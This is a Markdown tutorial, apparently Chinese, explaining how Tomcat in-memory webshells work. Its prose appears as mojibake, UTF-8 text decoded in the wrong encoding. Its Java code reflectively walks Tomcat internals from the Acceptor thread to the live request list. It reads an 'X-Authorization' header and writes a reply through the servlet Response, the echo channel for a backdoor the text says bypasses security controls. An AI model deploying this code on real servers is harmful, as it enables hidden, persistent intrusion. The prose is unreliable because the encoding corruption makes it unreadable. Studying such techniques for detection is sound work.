# ğŸ“˜ **Tomcat å†…å­˜é©¬åŸç†**

------

## 1ï¸âƒ£ Tomcat å†…å­˜é©¬

Tomcat å†…å­˜é©¬å±äºï¼š

```mathematica
åŸç”Ÿ Web å®¹å™¨å±‚ï¼ˆWeb Container Levelï¼‰å†…å­˜é©¬
```

**å®ƒä¸ä¾èµ–ï¼š**

- Spring
- Servlet
- Filter
- Controller

å®ƒç›´æ¥æŠŠâ€œå…¥å£â€ç»‘åœ¨ Tomcat çš„åº•å±‚çº¿ç¨‹ä¸Šã€‚

**å› æ­¤ï¼š**

- å®ƒæ¯” Spring å‹å†…å­˜é©¬æ›´åº•å±‚
- å®ƒæ•è·æ‰€æœ‰è¯·æ±‚
- å®ƒä¸éœ€è¦ URL æ˜ å°„
- å®ƒç»•è¿‡æ‰€æœ‰å®‰å…¨æ§åˆ¶



------

## 2ï¸âƒ£ Tomcat çš„ 3 ç±»æ ¸å¿ƒçº¿ç¨‹

------

### 1.  Acceptor çº¿ç¨‹

> è´Ÿè´£æ¥æ”¶å®¢æˆ·ç«¯ TCP è¿æ¥ï¼›Tomcat çš„ Accept çº¿ç¨‹åï¼š

```perl
http-nio-8080-Acceptor
```

æµ‹è¯•ï¼š

```java
@GetMapping
public List<String> result() throws Exception {
    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
    getThreads.setAccessible(true);
    List list = new ArrayList();
    Thread[] threads = (Thread[]) getThreads.invoke(null);

    for (Thread t : threads) {
        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
            Field f = t.getClass().getDeclaredField("target");
            f.setAccessible(true);
            Object acceptor = f.get(t);
            list.add("**********  " + acceptor.getClass().toString() + " ***************");
        }
        list.add(t.getName());
    }

    return list;
}
```

![image-20251128103937013](./assets/image-20251128103937013.png)

------

### 2 **Poller çº¿ç¨‹**

> è´Ÿè´£å°† socket æ³¨å†Œåˆ° Pollerï¼ˆNIOï¼‰

â€‹	çº¿ç¨‹åï¼š

```perl
http-nio-8080-Poller
```

------

### 3 Executor æ‰§è¡Œçº¿ç¨‹ï¼ˆå¤„ç†è¯·æ±‚ï¼‰

çœŸæ­£å¤„ç†è¯·æ±‚çš„å·¥ä½œçº¿ç¨‹

```perl
http-nio-8080-exec-1
http-nio-8080-exec-2
...
```





------

## 3ï¸âƒ£ å†…å­˜é©¬æ‰§è¡Œè¿‡ç¨‹ï¼š

> å¦‚ä¸‹ä»£ç è§£é‡Šè¿è¡Œè¿‡ç¨‹ï¼š

```java
@GetMapping
public List<String> result() throws Exception {
    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
    getThreads.setAccessible(true);
    List list = new ArrayList();
    Thread[] threads = (Thread[]) getThreads.invoke(null);

    for (Thread t : threads) {
        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
            Field f = t.getClass().getDeclaredField("target");
            f.setAccessible(true);
            Object acceptor = f.get(t);
            // class org.apache.tomcat.util.net.Acceptor
            list.add(">>> Acceptor = " + acceptor.getClass().toString());


            f = acceptor.getClass().getDeclaredField("endpoint");

            f.setAccessible(true);
            Object endpoint = f.get(acceptor);
            // class org.apache.tomcat.util.net.NioEndpoint
            list.add(">>> endpoint = " + endpoint.getClass().toString());

            try {
                f = endpoint.getClass().getDeclaredField("handler");

            } catch (NoSuchFieldException e) {
                try {
                    f = endpoint.getClass().getSuperclass().getDeclaredField("handler");
                } catch (NoSuchFieldException var12) {
                    f = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
            }

            f.setAccessible(true);
            Object handler = f.get(endpoint);
            // class org.apache.coyote.AbstractProtocol$ConnectionHandler
            list.add(">>> handler = " + handler.getClass());

            f = handler.getClass().getDeclaredField("global");
            f.setAccessible(true);
            Object global = f.get(handler);
            // class org.apache.coyote.RequestGroupInfo
            list.add(">>> global = " + global.getClass());

        }
        list.add(t.getName());
    }

    return list;
}
```

![image-20251128151956399](./assets/image-20251128151956399.png)



------

### 1. å†…å­˜é©¬æšä¸¾ Thread

 Tomcat çš„å…¥å£çº¿ç¨‹æœ¬è´¨ä¸Šåœ¨ JVM ä¸­å¸¸é©»ï¼š

```java
Method getThreads = Thread.class.getDeclaredMethod("getThreads");
getThreads.setAccessible(true);
Thread[] threads = (Thread[]) getThreads.invoke(null);
```

å½“æ”»å‡»è€…å¯ä»¥éå†æ‰€æœ‰çº¿ç¨‹æ—¶ï¼š

- å¯ä»¥æ‰¾åˆ°æ‰€æœ‰ Acceptor
- å¯ä»¥æ‰¾åˆ°æ‰€æœ‰ Poller
- å¯ä»¥æ‰¾åˆ°æ‰€æœ‰æ‰§è¡Œçº¿ç¨‹ï¼ˆexec-xï¼‰

è¿™æ˜¯â€œå†…å­˜é©¬ä¸­æœ€åº•å±‚çš„å…¥å£ç‚¹â€ã€‚



------

### 2. åˆ¤æ–­çº¿ç¨‹å contains("http") && contains("Acceptor")

> æ”»å‡»è€…è¦ç­›é€‰å‡ºï¼Œåªè´Ÿè´£æ¥æ”¶ HTTP è¯·æ±‚çš„çº¿ç¨‹

Tomcat Thread çš„å‘½åè§„åˆ™ï¼š

| ç±»å‹     | çº¿ç¨‹åç¤ºä¾‹             |
| -------- | ---------------------- |
| Acceptor | http-nio-8080-Acceptor |
| Poller   | http-nio-8080-Poller   |
| Worker   | http-nio-8080-exec-7   |

æ‰€ä»¥ï¼šæ‰¾åˆ° **HTTP è¿æ¥å…¥å£çº¿ç¨‹**ã€‚

```java
if (t.getName().contains("http") && t.getName().contains("Acceptor"))
```



------

### 3. Acceptor.target

å®ƒä½œä¸º Runnable å­˜åœ¨äº Thread ä¸­, å½“å½“å‰çº¿ç¨‹ä¸º `http-nio-8080-Acceptor`ï¼Œé‚£å®ƒå°†ä½œä¸ºï¼š

```mathematica
Thread.target â†’ Acceptor
```

Acceptor å†…éƒ¨å«æœ‰å¯¹çœŸæ­£â€œç½‘ç»œå…¥å£â€çš„å¼•ç”¨ï¼š

```
Acceptor.this.endpoint
```

å› ä¸º Acceptor åªæ˜¯æ¥æ”¶äº† tcp è¿æ¥ï¼Œå®ƒæœ¬èº«å¹¶ä¸å¤„ç† HTTP è¯·æ±‚ã€‚å®ƒå†…éƒ¨ä¿å­˜äº†

```nginx
endpoint â†’ handler
```

ç»“æ„å¦‚ä¸‹:

```scss
Acceptor
	â””â”€â”€ endpoint (NioEndpoint)
         â””â”€â”€ handler (ConnectionHandler)
                â””â”€â”€ global (RequestGroupInfo)
                      â””â”€â”€ processors (æ­£åœ¨å¤„ç†çš„æ‰€æœ‰è¯·æ±‚)
```



------

### 4. endpoint / handler / global / processors 

------

#### `endpoint`ï¼ˆNioEndpointï¼‰

> NioEndpoint æ˜¯ Tomcat çš„ NIO é€šé“å±‚ï¼Œ è´Ÿè´£ç®¡ç† Socket è¿æ¥ã€æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ã€å¤„ç†ç½‘ç»œ IO çš„åº•å±‚æ¨¡å—ï¼Œæ˜¯è¿æ¥ HTTP åè®®å¤„ç†å™¨ä¹‹å‰çš„â€œä¸€å±‚ç½‘ç»œå…¥å£â€ã€‚

- **socket è¯»**
- **socket å†™**
- **socket æ³¨å†Œåˆ° Poller**

å®ƒç»´æŠ¤ç€ä¸€ä¸ª ConnectionHandlerã€‚

------

#### `handler`ï¼ˆConnectionHandlerï¼‰

è´Ÿè´£ç®¡ç†æ‰€æœ‰è¿æ¥ä¸è¯·æ±‚çš„æœ€æ ¸å¿ƒç±»ï¼š

```
AbstractProtocol$ConnectionHandler
```

å†…éƒ¨æ‹¥æœ‰ä¸€ä¸ªâ€œå…¨å±€è¯·æ±‚ç›‘æ§å¯¹è±¡â€ï¼š

```csharp
RequestGroupInfo global;
```

------

#### `global` (RequestGroupInfo)

è¿™æ˜¯ä¸€ä¸ª **â€œå½“å‰æ‰€æœ‰è¯·æ±‚çš„å®¹å™¨â€**

å®ƒé‡Œé¢æœ‰ï¼š

```java
List<RequestInfo> processors;
```

------

#### `processors`

> ä¸€ä¸ª Listï¼Œé‡Œé¢æ˜¯æ‰€æœ‰ Worker æ­£åœ¨å¤„ç†çš„ Request

é€šè¿‡å®ƒå¯ä»¥æ‹¿åˆ°ï¼š

```scss
req(CoyoteRequest) â†’ getResponse()
```

è¿™å°±æ˜¯æœ€ç»ˆèƒ½æ‹¿åˆ° Response è¿›è¡Œå›æ˜¾çš„å…³é”®ã€‚



------

###  5. Response.getWriter å›æ˜¾

> å…ˆè´´payloadå’Œä»£ç 

```JAVA
@GetMapping
public List<String> result() throws Exception {
    Method getThreads = Thread.class.getDeclaredMethod("getThreads");
    getThreads.setAccessible(true);
    List list = new ArrayList();
    Thread[] threads = (Thread[]) getThreads.invoke(null);

    for (Thread t : threads) {
        if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
            Field f = t.getClass().getDeclaredField("target");
            f.setAccessible(true);
            Object acceptor = f.get(t);
            // class org.apache.tomcat.util.net.Acceptor
            list.add(">>> Acceptor = " + acceptor.getClass().toString());


            f = acceptor.getClass().getDeclaredField("endpoint");

            f.setAccessible(true);
            Object endpoint = f.get(acceptor);
            // class org.apache.tomcat.util.net.NioEndpoint
            list.add(">>> endpoint = " + endpoint.getClass().toString());

            try {
                f = endpoint.getClass().getDeclaredField("handler");

            } catch (NoSuchFieldException e) {
                try {
                    f = endpoint.getClass().getSuperclass().getDeclaredField("handler");
                } catch (NoSuchFieldException var12) {
                    f = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                }
            }

            f.setAccessible(true);
            Object handler = f.get(endpoint);
            // class org.apache.coyote.AbstractProtocol$ConnectionHandler
            list.add(">>> handler = " + handler.getClass());

            f = handler.getClass().getDeclaredField("global");
            f.setAccessible(true);
            Object global = f.get(handler);
            // class org.apache.coyote.RequestGroupInfo
            list.add(">>> global = " + global.getClass());

            f = global.getClass().getDeclaredField("processors");
            f.setAccessible(true);
            ArrayList processors = (ArrayList) f.get(global);
            for (Object processor : processors) {
                // processor â†’ req(Request)
                f = processor.getClass().getDeclaredField("req");
                f.setAccessible(true);
                Object request = f.get(processor);

                // request â†’ getHeader
                String cmd = (String) request.getClass().getMethod("getHeader",String.class).invoke(request, 				 "X-Authorization");

                if (cmd == null) continue;


                // 8. æ‹¿åˆ° response
                Object coyoteResponse = request.getClass().getMethod("getResponse").invoke(request);
                list.add(">>> coyoteResponse = " + coyoteResponse.getClass().toString());

                //
                f = coyoteResponse.getClass().getDeclaredField("notes");
                f.setAccessible(true);
                Object[] notes = (Object[]) f.get(coyoteResponse);

                // notes[1] æ˜¯ Catalina Response
                Object response = notes[1];
                Writer w = (Writer) response.getClass().getMethod("getWriter").invoke(response);

                // å†™å›æ˜¾
                w.write("Command header = " + cmd);
                w.flush();
                w.close();
            }

        }
        list.add(t.getName());
    }

    return list;
}
```

![image-20251128164351428](./assets/image-20251128164351428.png)

ä¸è¿‡æ­¤æ—¶çš„Response å±äº **Coyoteï¼ˆåè®®å±‚ï¼‰**ï¼Œ `org.apache.coyote.Response` **ä¸æ˜¯** Servlet å±‚çš„ Response

å®ƒæ²¡æœ‰ï¼š

- `getWriter()`
- `getOutputStream()`
- Servlet API ä¸­çš„æ‰€æœ‰æ–¹æ³•

å½“å‰æ‹¿åˆ°çš„æ˜¯ **åº•å±‚ Response**ï¼Œå®ƒè´Ÿè´£ HTTP è§£æä¸ä¼ è¾“ï¼Œä¸è´Ÿè´£å†™ Servlet è¾“å‡ºã€‚

#### 1. Tomcatä¸­Responseç»“æ„

```scss
HttpServletResponse (å¯æ§åˆ¶)
    â†‘
org.apache.catalina.connector.Response (Servlet å®¹å™¨å±‚)
    â†‘
org.apache.catalina.connector.ResponseFacade (çœŸæ­£ç»™åº”ç”¨æš´éœ²çš„)
    â†‘
org.apache.coyote.Response (åè®®å±‚)
```

å½“å‰å¤„äºæœ€åº•å±‚ï¼š

â€‹	`org.apache.coyote.Response`

éœ€è¦ä½¿ç”¨ï¼š

â€‹	`org.apache.catalina.connector.Response`

æˆ–

â€‹	`ResponseFacade`

è¿™ä¸¤ä¸ªç±»æ‰æœ‰ï¼š

```java
getWriter()
getOutputStream()
setHeader()
setStatus()
```

#### 2. è§£å†³åŠæ³•ï¼šä» org.apache.coyote.Response è·å–ä¸Šå±‚ Response

```java
// ä» Coyote Response è·å– Catalina Response
Field notesField = coyoteResponse.getClass().getDeclaredField("notes");
notesField.setAccessible(true);
Object[] notes = (Object[]) notesField.get(coyoteResponse);

// notes[1] æ˜¯ Catalina Response
Object response = notes[1];
```

é€šå¸¸å¾—åˆ°çš„å°±æ˜¯ï¼š

```
org.apache.catalina.connector.Response
```

#### 3. Writer å›æ˜¾

æ‹¿åˆ°Writer

```java
Writer w = (Writer) response.getClass().getMethod("getWriter").invoke(response);

// å†™å›æ˜¾
w.write("Command header = " + cmd);
w.flush();
w.close();
```

æ­¤æ—¶ **è¿˜åœ¨è¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸä¸­**
 Tomcat ä¼šè‡ªåŠ¨ flush è¾“å‡ºå†…å®¹
 æµè§ˆå™¨å°±èƒ½æ”¶åˆ°æ¶æ„å†…å­˜é©¬çš„è¾“å‡ºã€‚

å®ƒä¼šè¦†ç›–ä½  Controller ä¸­ return çš„å†…å®¹ã€‚



------

## 4ï¸âƒ£ æ€»ç»“ï¼šTomcat å†…å­˜é©¬çš„æ ¸å¿ƒé“¾è·¯å›¾

```scss
Thread ("http-nio-8080-Acceptor")
   â†“
target (Acceptor)
   â†“
endpoint (NioEndpoint)
   â†“
handler (ConnectionHandler)
   â†“
global (RequestGroupInfo)
   â†“
processors (List<RequestInfo>)
   â†“
req (CoyoteRequest)
   â†“
response (Response)
   â†“
writer.write()  â† å›æ˜¾
```

